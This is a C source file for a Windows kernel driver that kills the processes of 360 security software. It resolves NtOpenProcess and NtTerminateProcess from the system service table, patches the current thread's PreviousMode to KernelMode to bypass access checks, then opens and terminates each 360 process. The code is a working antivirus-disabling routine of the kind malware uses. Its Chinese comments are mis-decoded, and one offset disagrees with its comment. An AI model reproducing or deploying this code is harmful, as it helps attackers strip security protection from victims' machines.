#include "Kill360.h"
#include "ToolFunction.h"

typedef struct _PROCESS_INFO
{
	PWCHAR ProcessName;
	HANDLE ProcessId;
	HANDLE ProcessHandle;
}PROCESS_INFO, *PPROCESS_INFO;

PROCESS_INFO Lhp360ProcessTable[] = {
	{L"360tray.exe", 0, 0},
	{L"zhudongfangyu.exe", 0, 0},
	{L"softmgrlite.exe", 0, 0}
};


//���� SSDT
typedef struct _KSERVICE_TABLE_DESCRIPTOR {
	PULONG_PTR Base;
	PULONG Count;
	ULONG Limit;
	PUCHAR Number;
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;

extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;


//
// NtOpenProcess() ϵͳ�����
//
ULONG NtOpenProcessIndex_WinXP = 0x7A;
ULONG NtOpenProcessIndex_Win7 = 0xBE;

typedef
NTSTATUS
(__stdcall *PFN_NtOpenProcess)(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL
	);

//
// NtTerminateProcess() ϵͳ�����
//
ULONG NtTerminateProcessIndex_WinXP = 0x101;
ULONG NtTerminateProcessIndex_Win7 = 0x172;
typedef
NTSTATUS
(__stdcall *PFN_NtTerminateProcess)(
	IN HANDLE ProcessHandle,
	IN NTSTATUS ExitStatus
	);



//
// KTHREAD->PreviousModeƫ��:
// WinXP: 0x120
// Win7 32: 0x13a
// Win7 64: 
//
NTSTATUS LhpSetCurrentThreadPreviousMode(KPROCESSOR_MODE newMode)
{
	PVOID Thread = PsGetCurrentThread();
	PCCHAR pPreviousMode = NULL;
	ESystemVersion Version = e_Windows_NotSupport;
	LhpGetSystemVersion(&Version);

	if (Version == e_Windows_XP)
	{
		pPreviousMode = (PCCHAR)Thread + 0x140;
	}
	else if (Version == e_Windows_7)
	{
		pPreviousMode = (PCCHAR)Thread + 0x13a;
	}

	*pPreviousMode = newMode;

	return STATUS_SUCCESS;
}



NTSTATUS LhpKill360()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	ESystemVersion Verison = e_Windows_NotSupport;
	ULONG NtTerminateProcessServiceNumber = 0;
	ULONG NtOpenProcessServiceNumber = 0;
	PFN_NtOpenProcess NtOpenProcess = NULL;
	PFN_NtTerminateProcess NtTerminateProcess = NULL;
	ULONG Index = 0;
	KPROCESSOR_MODE oldMode = ExGetPreviousMode();


	//__asm int 3

	Status = LhpGetSystemVersion(&Verison);
	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	if (Verison == e_Windows_XP)
	{
		NtOpenProcessServiceNumber = NtOpenProcessIndex_WinXP;
		NtTerminateProcessServiceNumber = NtTerminateProcessIndex_WinXP;
	}
	else if (Verison == e_Windows_7)
	{
		NtOpenProcessServiceNumber = NtOpenProcessIndex_Win7;
		NtTerminateProcessServiceNumber = NtTerminateProcessIndex_Win7;
	}
	else
	{
		return STATUS_NOT_SUPPORTED;
	}

	//
	// ��SSDT�л�ȡɱ������غ�����ַ
	//
	NtOpenProcess = (PFN_NtOpenProcess)KeServiceDescriptorTable->Base[NtOpenProcessServiceNumber];
	NtTerminateProcess = (PFN_NtTerminateProcess)KeServiceDescriptorTable->Base[NtTerminateProcessServiceNumber];

	//
	// ��ȡ360��ؽ��̵�PID
	//
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		LhpGetProcessIdByName(Lhp360ProcessTable[Index].ProcessName, &Lhp360ProcessTable[Index].ProcessId);
	}

	//
	// ��ӡ��ȡ�Ľ���ID
	//
#ifdef DBG
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		KdPrint(("ProcessName: %ws    ProcessId: %d\n", Lhp360ProcessTable[Index].ProcessName, Lhp360ProcessTable[Index].ProcessId));
	}
#endif

	//
	// ����ΪKernelModeֱ�ӵ���NT����
	//
	LhpSetCurrentThreadPreviousMode(KernelMode);

	//
	// �򿪽��̻�ȡHANDLE
	//
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		CLIENT_ID Cid;
		OBJECT_ATTRIBUTES ObjectAttributes;

		if (Lhp360ProcessTable[Index].ProcessId == 0)
		{
			continue;
		}

		Cid.UniqueProcess = Lhp360ProcessTable[Index].ProcessId;
		Cid.UniqueThread = 0;

		InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

		Status = NtOpenProcess(&(Lhp360ProcessTable[Index].ProcessHandle), SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | SPECIFIC_RIGHTS_ALL, &ObjectAttributes, &Cid);
		if (NT_SUCCESS(Status))
		{
			KdPrint(("Open Process %ws successful!\n", Lhp360ProcessTable[Index].ProcessName));
		}
		else
		{
			KdPrint(("Open Process %ws failed! return 0x%08X\n", Lhp360ProcessTable[Index].ProcessName, Status));
		}
	}

	//
	// ����ɱ���̺�����ɱ
	//
	for (Index = 0; Index < sizeof(Lhp360ProcessTable)/sizeof(Lhp360ProcessTable[0]); Index++)
	{
		if (Lhp360ProcessTable[Index].ProcessId == 0 || Lhp360ProcessTable[Index].ProcessHandle == NULL)
		{
			continue;
		}

		Status = NtTerminateProcess(Lhp360ProcessTable[Index].ProcessHandle, 0);
		if (NT_SUCCESS(Status))
		{
			KdPrint(("Kill Process %ws successful!\n", Lhp360ProcessTable[Index].ProcessName));
		}
		else
		{
			KdPrint(("Kill Process %ws failed! return 0x%08X\n", Lhp360ProcessTable[Index].ProcessName, Status));
		}
		ZwClose(Lhp360ProcessTable[Index].ProcessHandle);
	}

	//
	// �ָ�֮ǰģʽ
	//
	LhpSetCurrentThreadPreviousMode(oldMode);

	return Status;
}
